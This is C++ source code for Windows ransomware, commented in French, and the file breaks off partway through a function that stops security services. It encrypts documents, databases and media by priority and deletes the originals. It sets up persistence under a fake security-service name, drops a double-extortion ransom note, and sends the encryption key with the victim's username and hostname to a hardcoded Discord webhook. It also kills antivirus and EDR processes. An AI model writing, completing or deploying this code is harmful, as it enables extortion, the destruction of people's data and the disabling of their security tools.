#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <chrono>
#include <random>
#include <algorithm>
#include <cstring>
#include <thread>
#include <future>
#include <atomic>
#include <mutex>
#include <iomanip>
#include <sstream>
#include <unordered_map>
#include <functional>

// Cryptographie
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>

// Windows API
#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#include <winreg.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#endif

// UUID generation
#ifdef _WIN32
#include <rpc.h>
#pragma comment(lib, "rpcrt4.lib")
#else
#include <uuid/uuid.h>
#endif

namespace fs = std::filesystem;

// Structure pour partager des données entre les threads
#ifdef _WIN32
struct SharedData {
    int totalFiles;
    std::atomic<int> processedFiles;
    HWND hwnd;
};
#endif

// Déclaration anticipée des fonctions Windows
#ifdef _WIN32
// Fonctions pour la fenêtre bloquante
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
DWORD WINAPI UpdateProgressThread(LPVOID lpParam);
HWND CreateFullscreenBlockingWindow(SharedData* data);

// Fonctions de contrôle système
bool disableTaskManager();
bool disableRegistry();
bool disableCmd();
bool preventShutdown();
bool disableSystemControls();
void killEssentialProcesses();
void setHighestPriority();
#endif

// Structure pour suivre l'état du chiffrement
struct EncryptionState {
    bool started;
    bool completed;
    std::vector<std::string> encryptedPaths;
};

// Configuration de la console Windows
#ifdef _WIN32
void setupConsole() {
    // Définir l'encodage en UTF-8
    SetConsoleOutputCP(CP_UTF8);
    // Activer le support des caractères spéciaux
    SetConsoleCP(CP_UTF8);
}
#endif

// Discord Webhook URL
const std::string WEBHOOK_URL = "https://discord.com/api/webhooks/1354564587751735437/Sf4ab7f_d5Q-HTyIwvfMcs-QPs2YGUVQwhEZUVZmaWtslZhI78YPCj1wmYzI7NU1eVnN";

// Bannière
const std::string BANNER = R"(
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗██╗    ██╗ █████╗ ██████╗ ███████╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║██║    ██║██╔══██╗██╔══██╗██╔════╝
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║██║ █╗ ██║███████║██████╔╝█████╗  
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║██║███╗██║██╔══██║██╔══██╗██╔══╝  
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║╚███╔███╔╝██║  ██║██║  ██║███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
                                                                          
                Vos fichiers ont été chiffrés! Payez la rançon pour récupérer vos données.
)";

// Extension pour les fichiers chiffrés
const std::string ENCRYPTED_EXTENSION = ".encrypted";

// Structure pour définir les priorités des types de fichiers
struct FileTypePriority {
    std::string extension;
    int priority;  // Plus le nombre est petit, plus la priorité est haute
    std::string description;
};

// Types de fichiers à chiffrer avec leurs priorités
const std::vector<FileTypePriority> FILE_PRIORITIES = {
    // Priorité 1 - Fichiers critiques
    {".sql", 1, "Base de données"},
    {".db", 1, "Base de données"},
    {".sqlite", 1, "Base de données"},
    {".key", 1, "Clés de sécurité"},
    {".pem", 1, "Certificats"},
    {".env", 1, "Variables d'environnement"},
    {".config", 1, "Fichiers de configuration"},
    
    // Priorité 2 - Documents importants
    {".doc", 2, "Documents Word"},
    {".docx", 2, "Documents Word"},
    {".xls", 2, "Tableurs Excel"},
    {".xlsx", 2, "Tableurs Excel"},
    {".pdf", 2, "Documents PDF"},
    {".ppt", 2, "Présentations PowerPoint"},
    {".pptx", 2, "Présentations PowerPoint"},
    
    // Priorité 3 - Autres documents
    {".txt", 3, "Fichiers texte"},
    {".rtf", 3, "Documents RTF"},
    {".odt", 3, "Documents OpenDocument"},
    {".csv", 3, "Données tabulaires"},
    {".json", 3, "Données JSON"},
    {".xml", 3, "Données XML"},
    
    // Priorité 4 - Images et médias
    {".jpg", 4, "Images JPEG"},
    {".jpeg", 4, "Images JPEG"},
    {".png", 4, "Images PNG"},
    {".gif", 4, "Images GIF"},
    {".bmp", 4, "Images BMP"},
    {".tiff", 4, "Images TIFF"},
    {".svg", 4, "Images vectorielles"},
    {".webp", 4, "Images WebP"},
    {".mp3", 4, "Audio MP3"},
    {".mp4", 4, "Vidéo MP4"},
    {".wav", 4, "Audio WAV"},
    {".avi", 4, "Vidéo AVI"},
    {".mov", 4, "Vidéo MOV"},
    {".flv", 4, "Vidéo FLV"},
    {".mkv", 4, "Vidéo MKV"},
    
    // Priorité 5 - Archives et autres
    {".zip", 5, "Archives ZIP"},
    {".rar", 5, "Archives RAR"},
    {".7z", 5, "Archives 7-Zip"},
    {".tar", 5, "Archives TAR"},
    {".gz", 5, "Archives GZ"},
    {".bak", 5, "Sauvegardes"},
    {".backup", 5, "Sauvegardes"},
    {".old", 5, "Anciens fichiers"},
    {".log", 5, "Fichiers de logs"}
};

// Dossiers à éviter
const std::vector<std::string> EXCLUDE_DIRS = {
    "Windows", "Program Files", "Program Files (x86)", "AppData", 
    "ProgramData", "$Recycle.Bin", "Microsoft", "Boot", "System Volume Information", 
    "bootmgr", "Recovery", "PerfLogs"
};

// Fonctions utilitaires
std::string GenerateUUID() {
#ifdef _WIN32
    UUID uuid;
    UuidCreate(&uuid);
    
    unsigned char* str;
    UuidToStringA(&uuid, &str);
    
    std::string uuid_str(reinterpret_cast<char*>(str));
    RpcStringFreeA(&str);
    
    return uuid_str;
#else
    uuid_t uuid;
    char uuid_str[37];
    
    uuid_generate_random(uuid);
    uuid_unparse_lower(uuid, uuid_str);
    
    return std::string(uuid_str);
#endif
}

// Base64 encode
std::string Base64Encode(const std::vector<unsigned char>& data) {
    BIO* b64 = BIO_new(BIO_f_base64());
    BIO* bmem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, bmem);
    BIO_write(b64, data.data(), static_cast<int>(data.size()));
    BIO_flush(b64);
    
    BUF_MEM* bptr;
    BIO_get_mem_ptr(b64, &bptr);
    
    std::string result(bptr->data, bptr->length - 1); // Remove trailing newline
    BIO_free_all(b64);
    
    return result;
}

// Ajout de la persistance au démarrage
bool AddToStartup(const std::string& exePath, const std::string& regName) {
#ifdef _WIN32
    HKEY hKey;
    LONG lResult = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    
    if (lResult != ERROR_SUCCESS) {
        return false;
    }
    
    lResult = RegSetValueExA(hKey, regName.c_str(), 0, REG_SZ, (BYTE*)exePath.c_str(), 
                          static_cast<DWORD>(exePath.length() + 1));
    RegCloseKey(hKey);
    
    return lResult == ERROR_SUCCESS;
#else
    // Non supporté sur les plateformes non-Windows
    return false;
#endif
}

// Supprimer la persistance au démarrage
bool RemoveFromStartup(const std::string& regName) {
#ifdef _WIN32
    HKEY hKey;
    LONG lResult = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    
    if (lResult != ERROR_SUCCESS) {
        return false;
    }
    
    lResult = RegDeleteValueA(hKey, regName.c_str());
    RegCloseKey(hKey);
    
    return lResult == ERROR_SUCCESS;
#else
    // Non supporté sur les plateformes non-Windows
    return false;
#endif
}

// Obtenir le chemin de l'exécutable
std::string GetExecutablePath() {
#ifdef _WIN32
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
#else
    // Linux & macOS
    char buffer[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", buffer, sizeof(buffer) - 1);
    if (len != -1) {
        buffer[len] = '\0';
        return std::string(buffer);
    }
    return "";
#endif
}

// Fonction pour envoyer des données via HTTP POST
bool SendHttpPost(const std::string& url, const std::string& data) {
#ifdef _WIN32
    // Initialiser WinINet
    HINTERNET hInternet = InternetOpenA("RansomwareClient/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return false;
    }
    
    // Analyser l'URL
    URL_COMPONENTS urlComp;
    char hostName[256];
    char urlPath[1024];
    
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath);
    
    if (!InternetCrackUrlA(url.c_str(), url.length(), 0, &urlComp)) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // Se connecter au serveur
    HINTERNET hConnect = InternetConnectA(hInternet, hostName, urlComp.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // Créer la requête
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // Headers
    const char* headers = "Content-Type: application/json\r\n";
    
    // Envoyer la requête
    BOOL result = HttpSendRequestA(hRequest, headers, -1, (LPVOID)data.c_str(), static_cast<DWORD>(data.length()));
    
    // Nettoyer
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return result != FALSE;
#else
    // Sur les plateformes non-Windows, on peut utiliser libcurl ou une simple implémentation socket
    // Mais pour cet exemple, on retourne juste false
    return false;
#endif
}

// Classe pour le chiffrement/déchiffrement
class Encryption {
private:
    std::vector<unsigned char> key;
    std::vector<unsigned char> iv;
    
public:
    // Constructeur - Génère une nouvelle clé et IV
    Encryption() {
        key.resize(32); // AES-256
        iv.resize(16);  // Bloc AES
        
        // Générer une clé aléatoire
        RAND_bytes(key.data(), key.size());
        RAND_bytes(iv.data(), iv.size());
    }
    
    // Constructeur - Charger une clé existante
    Encryption(const std::string& keyPath) {
        key.resize(32);
        iv.resize(16);
        
        // Charger la clé depuis un fichier
        std::ifstream keyFile(keyPath, std::ios::binary);
        if (!keyFile) {
            throw std::runtime_error("Impossible d'ouvrir le fichier de clé");
        }
        
        keyFile.read(reinterpret_cast<char*>(key.data()), key.size());
        keyFile.read(reinterpret_cast<char*>(iv.data()), iv.size());
    }
    
    // Obtenir la clé
    const std::vector<unsigned char>& getKey() const {
        return key;
    }
    
    // Obtenir l'IV
    const std::vector<unsigned char>& getIV() const {
        return iv;
    }
    
    // Sauvegarder la clé
    void saveKey(const std::string& keyPath) {
        std::ofstream keyFile(keyPath, std::ios::binary);
        if (!keyFile) {
            throw std::runtime_error("Impossible de créer le fichier de clé");
        }
        
        keyFile.write(reinterpret_cast<const char*>(key.data()), key.size());
        keyFile.write(reinterpret_cast<const char*>(iv.data()), iv.size());
    }
    
    // Chiffrer un fichier
    bool encryptFile(const std::string& filePath) {
        std::ifstream inFile(filePath, std::ios::binary);
        if (!inFile) return false;
        
        std::string outFilePath = filePath + ENCRYPTED_EXTENSION;
        std::ofstream outFile(outFilePath, std::ios::binary);
        if (!outFile) return false;
        
        // Initialiser le contexte de chiffrement
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return false;
        
        // Initialiser l'opération de chiffrement
        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key.data(), iv.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        // Écrire l'IV au début du fichier chiffré
        outFile.write(reinterpret_cast<const char*>(iv.data()), iv.size());
        
        // Chiffrer le fichier
        const int bufSize = 4096;
        std::vector<unsigned char> inBuf(bufSize);
        std::vector<unsigned char> outBuf(bufSize + EVP_MAX_BLOCK_LENGTH);
        int outLen;
        
        while (inFile) {
            inFile.read(reinterpret_cast<char*>(inBuf.data()), bufSize);
            int bytesRead = static_cast<int>(inFile.gcount());
            if (bytesRead <= 0) break;
            
            if (EVP_EncryptUpdate(ctx, outBuf.data(), &outLen, inBuf.data(), bytesRead) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                return false;
            }
            
            outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        }
        
        // Finaliser le chiffrement
        if (EVP_EncryptFinal_ex(ctx, outBuf.data(), &outLen) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        
        // Nettoyer
        EVP_CIPHER_CTX_free(ctx);
        
        return true;
    }
    
    // Déchiffrer un fichier
    bool decryptFile(const std::string& encryptedFilePath) {
        if (!fs::exists(encryptedFilePath)) return false;
        
        // Vérifier l'extension
        if (encryptedFilePath.find(ENCRYPTED_EXTENSION) == std::string::npos) return false;
        
        // Ouvrir le fichier chiffré
        std::ifstream inFile(encryptedFilePath, std::ios::binary);
        if (!inFile) return false;
        
        // Lire l'IV depuis le début du fichier
        std::vector<unsigned char> fileIv(16);
        inFile.read(reinterpret_cast<char*>(fileIv.data()), fileIv.size());
        
        // Créer le chemin du fichier déchiffré
        std::string outFilePath = encryptedFilePath.substr(0, encryptedFilePath.length() - ENCRYPTED_EXTENSION.length());
        std::ofstream outFile(outFilePath, std::ios::binary);
        if (!outFile) return false;
        
        // Initialiser le contexte de déchiffrement
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return false;
        
        // Initialiser l'opération de déchiffrement
        if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key.data(), fileIv.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        // Déchiffrer le fichier
        const int bufSize = 4096;
        std::vector<unsigned char> inBuf(bufSize);
        std::vector<unsigned char> outBuf(bufSize + EVP_MAX_BLOCK_LENGTH);
        int outLen;
        
        while (inFile) {
            inFile.read(reinterpret_cast<char*>(inBuf.data()), bufSize);
            int bytesRead = static_cast<int>(inFile.gcount());
            if (bytesRead <= 0) break;
            
            if (EVP_DecryptUpdate(ctx, outBuf.data(), &outLen, inBuf.data(), bytesRead) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                return false;
            }
            
            outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        }
        
        // Finaliser le déchiffrement
        if (EVP_DecryptFinal_ex(ctx, outBuf.data(), &outLen) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        
        // Nettoyer
        EVP_CIPHER_CTX_free(ctx);
        
        return true;
    }
};

// Fonction pour sauvegarder l'état du chiffrement
void saveEncryptionState(const EncryptionState& state) {
#ifdef _WIN32
    try {
        // Sauvegarder l'état dans le registre
        HKEY hKey;
        if (RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\State", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            // Sauvegarder si le chiffrement a commencé
            DWORD started = state.started ? 1 : 0;
            RegSetValueExA(hKey, "Started", 0, REG_DWORD, (BYTE*)&started, sizeof(started));
            
            // Sauvegarder si le chiffrement est terminé
            DWORD completed = state.completed ? 1 : 0;
            RegSetValueExA(hKey, "Completed", 0, REG_DWORD, (BYTE*)&completed, sizeof(completed));
            
            // Sauvegarder les chemins déjà chiffrés
            std::string paths;
            for (const auto& path : state.encryptedPaths) {
                paths += path + ";";
            }
            
            RegSetValueExA(hKey, "EncryptedPaths", 0, REG_SZ, (BYTE*)paths.c_str(), static_cast<DWORD>(paths.length() + 1));
            
            RegCloseKey(hKey);
        }
    }
    catch (...) {
        // Ignorer les erreurs
    }
#endif
}

// Fonction pour charger l'état du chiffrement
EncryptionState loadEncryptionState() {
    EncryptionState state;
    state.started = false;
    state.completed = false;
    
#ifdef _WIN32
    try {
        // Charger l'état depuis le registre
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\State", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            // Charger si le chiffrement a commencé
            DWORD started = 0;
            DWORD size = sizeof(started);
            if (RegQueryValueExA(hKey, "Started", NULL, NULL, (BYTE*)&started, &size) == ERROR_SUCCESS) {
                state.started = (started == 1);
            }
            
            // Charger si le chiffrement est terminé
            DWORD completed = 0;
            size = sizeof(completed);
            if (RegQueryValueExA(hKey, "Completed", NULL, NULL, (BYTE*)&completed, &size) == ERROR_SUCCESS) {
                state.completed = (completed == 1);
            }
            
            // Charger les chemins déjà chiffrés
            char paths[4096] = {0};
            size = sizeof(paths);
            if (RegQueryValueExA(hKey, "EncryptedPaths", NULL, NULL, (BYTE*)paths, &size) == ERROR_SUCCESS) {
                std::string pathsStr(paths);
                std::string delimiter = ";";
                
                size_t pos = 0;
                std::string token;
                while ((pos = pathsStr.find(delimiter)) != std::string::npos) {
                    token = pathsStr.substr(0, pos);
                    state.encryptedPaths.push_back(token);
                    pathsStr.erase(0, pos + delimiter.length());
                }
            }
            
            RegCloseKey(hKey);
        }
    }
    catch (...) {
        // Ignorer les erreurs
    }
#endif
    
    return state;
}

// Vérifier si le ransomware est déjà en cours d'exécution
bool isRansomwareRunning() {
    // Création d'un mutex global
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\RansomwareLock");
    
    // Si le mutex existe déjà, le ransomware est en cours d'exécution
    if (hMutex != NULL && GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return true;
    }
    
    // Si non, on garde le handle ouvert pour le verrouillage
    return false;
}

// Classe principale du ransomware
class Ransomware {
private:
    Encryption encryption;
    std::string victimId;
    std::string desktopPath;
    std::string documentsPath;
    std::string ransomNotePath;
    std::atomic<int> encryptedFilesCount;
    std::atomic<int> failedFilesCount;
    std::mutex outputMutex;
    
    // Vérifie si un chemin est sûr
    bool isSafePath(const std::string& path) {
        std::string lowerPath = path;
        std::transform(lowerPath.begin(), lowerPath.end(), lowerPath.begin(), ::tolower);
        
        for (const auto& excludeDir : EXCLUDE_DIRS) {
            std::string lowerExclude = excludeDir;
            std::transform(lowerExclude.begin(), lowerExclude.end(), lowerExclude.begin(), ::tolower);
            
            if (lowerPath.find(lowerExclude) != std::string::npos) {
                return false;
            }
        }
        
        return true;
    }
    
    // Traite un fichier
    bool processFile(const std::string& filePath) {
        try {
            // Vérifier si le fichier est déjà chiffré
            if (filePath.find(ENCRYPTED_EXTENSION) != std::string::npos) {
                return false;
            }
            
            // Vérifier l'extension du fichier
            fs::path path(filePath);
            std::string extension = path.extension().string();
            std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
            
            // Trouver la priorité du type de fichier
            int filePriority = INT_MAX;
            for (const auto& fileType : FILE_PRIORITIES) {
                if (extension == fileType.extension) {
                    filePriority = fileType.priority;
                    break;
                }
            }
            
            // Si l'extension n'est pas dans notre liste, ignorer le fichier
            if (filePriority == INT_MAX) {
                return false;
            }
            
            // Chiffrer le fichier
            bool success = encryption.encryptFile(filePath);
            
            if (success) {
                // Supprimer le fichier original
                fs::remove(filePath);
                encryptedFilesCount++;
                
                {
                    std::lock_guard<std::mutex> lock(outputMutex);
                    std::cout << "[+] Chiffré (Priorité " << filePriority << "): " << filePath << std::endl;
                }
                
                return true;
            }
            else {
                failedFilesCount++;
                return false;
            }
        }
        catch (...) {
            failedFilesCount++;
            return false;
        }
    }
    
    // Parcourir récursivement un répertoire
    void scanAndEncrypt(const std::string& directoryPath) {
        try {
            if (!isSafePath(directoryPath)) {
                return;
            }
            
            // Utiliser une file de priorité avec allocation en bloc pour éviter la fragmentation mémoire
            const int BLOCK_SIZE = 10000; // Allouer les fichiers par blocs de 10000
            std::vector<std::pair<std::string, int>> filesToProcess;
            filesToProcess.reserve(BLOCK_SIZE);
            
            // Créer un cache pour les extensions
            std::unordered_map<std::string, int> extensionPriorityCache;
            for (const auto& fileType : FILE_PRIORITIES) {
                extensionPriorityCache[fileType.extension] = fileType.priority;
            }
            
            // Parcourir le système de fichiers plus rapidement en utilisant un accès direct
            std::function<void(const std::string&)> scanDirectory = [&](const std::string& path) {
                try {
                    // Vérifier si le chemin est sûr avant de continuer
                    if (!isSafePath(path)) return;
                    
                    WIN32_FIND_DATAA findData;
                    HANDLE hFind = FindFirstFileA((path + "\\*").c_str(), &findData);
                    
                    if (hFind == INVALID_HANDLE_VALUE) return;
                    
                    do {
                        // Ignorer les répertoires spéciaux
                        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
                            continue;
                        
                        std::string fullPath = path + "\\" + findData.cFileName;
                        
                        // Si c'est un dossier, le parcourir récursivement
                        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                            scanDirectory(fullPath);
                        }
                        // Si c'est un fichier, l'ajouter à la liste avec sa priorité
                        else {
                            // Extraire l'extension
                            std::string fileName = findData.cFileName;
                            size_t dotPosition = fileName.find_last_of('.');
                            if (dotPosition != std::string::npos) {
                                std::string extension = fileName.substr(dotPosition);
                                std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
                                
                                // Rechercher la priorité dans le cache
                                auto it = extensionPriorityCache.find(extension);
                                if (it != extensionPriorityCache.end()) {
                                    filesToProcess.push_back({fullPath, it->second});
                                }
                            }
                        }
                        
                    } while (FindNextFileA(hFind, &findData));
                    
                    FindClose(hFind);
                }
                catch (...) {
                    // Ignorer les erreurs et continuer
                }
            };
            
            // Démarrer le scan de fichiers
            scanDirectory(directoryPath);
            
            // Trier les fichiers par priorité (plus petit = plus haute priorité)
            std::sort(filesToProcess.begin(), filesToProcess.end(),
                     [](const auto& a, const auto& b) { return a.second < b.second; });
            
            // Traiter les fichiers par blocs de même priorité pour maximiser la localité
            int currentPriority = 0;
            std::vector<std::string> currentBatch;
            
            for (const auto& [filePath, priority] : filesToProcess) {
                if (currentPriority != priority && !currentBatch.empty()) {
                    // Traiter le bloc précédent
                    processBatch(currentBatch);
                    currentBatch.clear();
                }
                
                currentPriority = priority;
                currentBatch.push_back(filePath);
                
                // Traiter les blocs de taille fixe pour éviter de surcharger la mémoire
                if (currentBatch.size() >= 1000) {
                    processBatch(currentBatch);
                    currentBatch.clear();
                }
            }
            
            // Traiter le dernier bloc
            if (!currentBatch.empty()) {
                processBatch(currentBatch);
            }
        }
        catch (...) {
            // Ignorer les erreurs
        }
    }
    
    // Nouvelle méthode pour traiter un lot de fichiers
    void processBatch(const std::vector<std::string>& batch) {
        // Traiter les fichiers en parallèle
        unsigned int hw_threads = 4; // Valeur par défaut
        
        // Obtenir le nombre de threads matériels disponibles de façon sûre
        unsigned int detected = std::thread::hardware_concurrency();
        if (detected > 0) {
            hw_threads = detected;
        }
        
        // Calculer le nombre de threads à utiliser
        unsigned int batchSize = static_cast<unsigned int>(batch.size());
        unsigned int threadsToUse = batchSize < hw_threads ? batchSize : hw_threads;
        const unsigned int numThreads = threadsToUse;
        
        std::vector<std::thread> threads;
        for (unsigned int i = 0; i < numThreads; i++) {
            threads.push_back(std::thread([this, &batch, i, numThreads]() {
                for (size_t j = i; j < batch.size(); j += numThreads) {
                    processFile(batch[j]);
                }
            }));
        }
        
        // Attendre que tous les threads terminent
        for (auto& thread : threads) {
            if (thread.joinable()) {
                thread.join();
            }
        }
    }
    
    // Créer la note de rançon
    void createRansomNote() {
        std::ofstream noteFile(ransomNotePath);
        if (!noteFile) return;
        
        noteFile << BANNER << std::endl << std::endl;
        noteFile << "!!! ATTENTION !!!" << std::endl << std::endl;
        noteFile << "Tous vos fichiers importants ont été chiffrés avec un algorithme militaire AES-256." << std::endl;
        noteFile << "Vos photos, documents, vidéos, et autres données personnelles sont maintenant inaccessibles." << std::endl << std::endl;
        noteFile << "⚠️ DOUBLE EXTORSION ⚠️" << std::endl;
        noteFile << "Nous avons également volé vos fichiers sensibles avant le chiffrement." << std::endl;
        noteFile << "Si vous ne payez pas la rançon, nous publierons ces fichiers sur Internet." << std::endl << std::endl;
        noteFile << "Pour récupérer vos fichiers, vous devez payer une rançon." << std::endl << std::endl;
        noteFile << "Instructions:" << std::endl;
        noteFile << "1. Envoyez 500$ en Bitcoin à l'adresse: 1A2B3C4D5E6F7G8H9I0J" << std::endl;
        noteFile << "2. Envoyez la preuve de paiement et votre ID unique à: evil@hacker.com" << std::endl;
        noteFile << "3. Vous recevrez un outil de déchiffrement et la clé unique pour restaurer vos fichiers" << std::endl;
        noteFile << "4. Nous supprimerons les copies de vos fichiers volés" << std::endl << std::endl;
        noteFile << "ATTENTION:" << std::endl;
        noteFile << "- N'essayez pas de déchiffrer vos fichiers vous-même, vous risquez de les perdre définitivement" << std::endl;
        noteFile << "- Ne reformatez pas votre système, vous perdriez toutes vos données" << std::endl;
        noteFile << "- Vous avez 72 heures pour payer, après quoi le prix doublera" << std::endl;
        noteFile << "- Après 7 jours, vos fichiers seront publiés et la clé de déchiffrement détruite" << std::endl << std::endl;
        noteFile << "Votre ID unique est: " << victimId << std::endl;
        noteFile << "Nombre de fichiers chiffrés: " << encryptedFilesCount << std::endl;
        
        // Obtenir la date et l'heure actuelles
        auto now = std::chrono::system_clock::now();
        std::time_t time = std::chrono::system_clock::to_time_t(now);
        noteFile << "Date et heure du chiffrement: " << std::ctime(&time) << std::endl;
    }
    
    // Changer le fond d'écran (Windows uniquement)
    void changeDesktopBackground() {
#ifdef _WIN32
        // Cette fonction nécessiterait d'implémenter la création d'image
        // Ce qui dépasse le cadre de cet exemple
        // Vous pourriez utiliser une bibliothèque comme GDI+ ou simplement
        // copier une image existante
#endif
    }
    
    // Configuration de la persistance
    bool setupPersistence() {
        std::string exePath = GetExecutablePath();
        if (exePath.empty()) return false;
        
        return AddToStartup(exePath, "WindowsSecurityService");
    }

    // Envoyer la clé via webhook
    bool sendKeyToWebhook() {
        try {
            // Convertir la clé en base64
            std::string keyBase64 = Base64Encode(encryption.getKey());
            
            // Collecter les informations système
            char hostname[256];
            gethostname(hostname, sizeof(hostname));
            
            char username[256];
            DWORD usernameLen = sizeof(username);
            GetUserNameA(username, &usernameLen);
            
            // Date et heure actuelles
            auto now = std::chrono::system_clock::now();
            std::time_t time = std::chrono::system_clock::to_time_t(now);
            std::stringstream dateStr;
            dateStr << std::put_time(std::localtime(&time), "%Y-%m-%d %H:%M:%S");
            
            // Créer le payload JSON
            std::stringstream jsonPayload;
            jsonPayload << "{";
            jsonPayload << "\"content\": \"Nouvelle victime: " << victimId << "\",";
            jsonPayload << "\"embeds\": [{";
            jsonPayload << "\"title\": \"Informations de la victime\",";
            jsonPayload << "\"color\": 15548997,";
            jsonPayload << "\"fields\": [";
            jsonPayload << "{\"name\": \"ID\", \"value\": \"" << victimId << "\", \"inline\": true},";
            jsonPayload << "{\"name\": \"Nom d'utilisateur\", \"value\": \"" << username << "\", \"inline\": true},";
            jsonPayload << "{\"name\": \"Ordinateur\", \"value\": \"" << hostname << "\", \"inline\": true},";
            jsonPayload << "{\"name\": \"OS\", \"value\": \"" << "Windows " << GetSystemMetrics(SM_SERVERR2) << "\", \"inline\": true},";
            jsonPayload << "{\"name\": \"Fichiers chiffrés\", \"value\": \"" << encryptedFilesCount << "\", \"inline\": true},";
            jsonPayload << "{\"name\": \"Date/Heure\", \"value\": \"" << dateStr.str() << "\", \"inline\": true},";
            jsonPayload << "{\"name\": \"Clé (Base64)\", \"value\": \"" << keyBase64 << "\", \"inline\": false}";
            jsonPayload << "]}]}";
            
            // Envoyer via webhook
            return SendHttpPost(WEBHOOK_URL, jsonPayload.str());
        }
        catch (...) {
            return false;
        }
    }

    // Fonction pour désactiver les antivirus et EDR
    bool disableSecuritySoftware() {
#ifdef _WIN32
        // Liste des processus d'antivirus courants à arrêter
        const std::vector<std::string> securityProcesses = {
            "MsMpEng.exe",      // Windows Defender
            "NisSrv.exe",      // Windows Defender
            "MsSense.exe",     // Windows Defender ATP
            "MsSecFlt.exe",    // Windows Defender
            "AvastUI.exe",     // Avast
            "avgui.exe",       // AVG
            "mcshield.exe",    // McAfee
            "bdagent.exe",     // Bitdefender
            "kav.exe",         // Kaspersky
            "nsav.exe",        // Norton
            "fsavgui.exe",     // F-Secure
            "bdagent.exe",     // Bitdefender
            "mcafee.exe",      // McAfee
            "sophos.exe",      // Sophos
            "crowdstrike.exe", // CrowdStrike
            "carbonblack.exe", // Carbon Black
            "sentinel.exe",    // SentinelOne
            "cylance.exe",     // Cylance
            "tanium.exe",      // Tanium
            "sysmon.exe"       // Sysmon
        };

        // Liste des services à arrêter
        const std::vector<std::string> securityServices = {
            "WinDefend",           // Windows Defender
            "SecurityHealthService", // Windows Security
            "MsMpSvc",            // Windows Defender
            "NisSrv",             // Windows Defender
            "MsSense",            // Windows Defender ATP
            "MsSecFlt",           // Windows Defender
            "avast",              // Avast
            "avg",                // AVG
            "McAfee",             // McAfee
            "kav",                // Kaspersky
            "norton",             // Norton
            "fs",                 // F-Secure
            "bdagent",            // Bitdefender
            "sophos",             // Sophos
            "crowdstrike",        // CrowdStrike
            "carbonblack",        // Carbon Black
            "sentinel",           // SentinelOne
            "cylance",            // Cylance
            "tanium",             // Tanium
            "sysmon"              // Sysmon
        };

        bool success = false;

        // Arrêter les processus
        for (const auto& process : securityProcesses) {
            std::string cmd = "taskkill /F /IM " + process + " /T >nul 2>&1";
            if (system(cmd.c_str()) == 0) {
                success = true;
            }
        }

        // Arrêter les services
